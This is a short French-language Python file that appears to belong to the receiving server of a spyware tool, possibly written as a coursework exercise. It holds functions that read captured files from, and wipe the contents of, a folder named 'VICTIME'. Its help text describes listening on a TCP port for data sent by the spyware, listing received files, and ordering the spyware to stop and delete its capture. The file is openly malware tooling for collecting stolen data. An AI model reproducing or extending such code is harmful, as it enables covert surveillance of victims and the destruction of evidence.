import os

def SupprimerFIchierDossier():
    Dossier = "VICTIME/"
    try:
        for Fichier in os.listdir(Dossier):
            CheminFichier = os.path.join(Dossier, Fichier)
            if os.path.isfile(CheminFichier):
                os.remove(CheminFichier)
                print(f"Le fichier {Fichier} a été supprimé.")
        print("Tous les fichiers ont été supprimés avec succès.")

    except Exception as e:
        print(f"Une erreur s'est produite lors de la suppression des fichiers : {e}")

def LireContenuFichier(NomFichier):
    CheminFichier = os.path.join("VICTIME", NomFichier)
    
    # Vérifier si le fichier existe
    if not os.path.exists(CheminFichier):
        print(f"Le fichier {CheminFichier} est introuvable.")
        return None

    try:
        with open(CheminFichier, 'r') as fichier:
            Contenu = fichier.read()
            print("Contenu du fichier :")
            print(Contenu)
            return Contenu
    except Exception as e:
        print(f"Une erreur s'est produite lors de la lecture du fichier {CheminFichier}: {e}")
        return None

def AfficherAide():
    print("Options disponibles:")
    print("-h, --help : Affiche l'aide et les différentes options.")
    print("-l, --listen <port> : Se met en écoute sur le port TCP spécifié et attend les données du spyware.")
    print("-s, --show : Affiche la liste des fichiers reçus par le programme.")
    print("-r, --readfile <nom_fichier> : Affiche le contenu du fichier stocké sur le serveur du spyware.")
    print("-k, --kill : Arrête toutes les instances de serveurs en cours, avertit le spyware de s'arrêter et de supprimer la capture.")
